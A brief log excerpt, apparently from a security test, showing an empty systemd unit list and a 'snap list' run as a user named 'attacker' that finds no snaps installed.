+  UNIT LOAD ACTIVE SUB DESCRIPTION
+
+0 loaded units listed.
+No snaps are installed yet. Try 'snap install hello-world'.
+
+## attacker final snap list
+$ runuser -u attacker -- snap list
+No snaps are installed yet. Try 'snap install hello-world'.
+rc=0
